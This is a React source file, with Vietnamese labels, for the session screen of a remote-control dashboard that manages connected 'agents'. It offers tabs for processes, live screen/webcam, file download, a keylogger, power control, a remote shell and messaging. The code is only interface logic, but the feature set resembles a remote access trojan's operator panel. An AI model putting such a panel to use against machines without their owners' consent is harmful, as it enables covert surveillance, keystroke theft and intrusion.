import { useState } from 'react';
import { useAgent } from './core.jsx';
import {
  ProcessesModule,
  LiveViewModule,
  FileManagerModule,
  KeyloggerModule,
  PowerModule,
  ShellModule,
  MessageModule,
} from './modules.jsx';

const MODULES = [
  { key: 'processes', label: 'Tiến trình', Component: ProcessesModule },
  { key: 'live', label: 'Live Screen / Webcam', Component: LiveViewModule },
  { key: 'files', label: 'File Download', Component: FileManagerModule },
  { key: 'keylogger', label: 'Keylogger', Component: KeyloggerModule },
  { key: 'power', label: 'Power Control', Component: PowerModule },
  { key: 'shell', label: 'Shell', Component: ShellModule },
  { key: 'message', label: 'Nhắn tin', Component: MessageModule },
];

export default function SessionView() {
  const { agents, activeSession, disconnectSession } = useAgent();
  const [activeTab, setActiveTab] = useState('processes');

  const agent = agents.find((a) => a.id === activeSession);
  if (!agent) {
    return (
      <div className="page session">
        <div className="empty-state">Phiên điều khiển không còn hiệu lực.</div>
        <button className="btn" onClick={disconnectSession} type="button">
          Về Dashboard
        </button>
      </div>
    );
  }

  const online = agent.status === 'online';

  return (
    <div className="page session">
      <header className="topbar">
        <button className="btn btn-ghost back-btn" onClick={disconnectSession} type="button">
          &lt; Dashboard
        </button>
        <div className="session-title">
          <span className={`dot ${online ? 'online' : 'offline'}`} />
          <div>
            <div className="brand-name">{agent.name}</div>
            <div className="brand-sub">
              {agent.ip} · {agent.os}
            </div>
          </div>
        </div>
        <div className="topbar-right">
          <span className={`server-pill ${online ? 'ok' : 'bad'}`}>
            <span className="pill-dot" />
            {online ? 'Đang điều khiển' : 'Agent offline'}
          </span>
        </div>
      </header>

      {!online && (
        <div className="offline-banner">Agent đã ngắt kết nối — các lệnh gửi tới sẽ thất bại cho tới khi Agent trực tuyến trở lại.</div>
      )}

      <div className="module-tabs">
        {MODULES.map((m) => (
          <button
            key={m.key}
            className={`module-tab ${activeTab === m.key ? 'active' : ''}`}
            onClick={() => setActiveTab(m.key)}
            type="button"
          >
            {m.label}
          </button>
        ))}
      </div>

      <div className="module-content">
        {MODULES.map((m) => (
          <div key={m.key} className={`module-pane ${activeTab === m.key ? 'active' : ''}`}>
            <m.Component agent={agent} />
          </div>
        ))}
      </div>
    </div>
  );
}
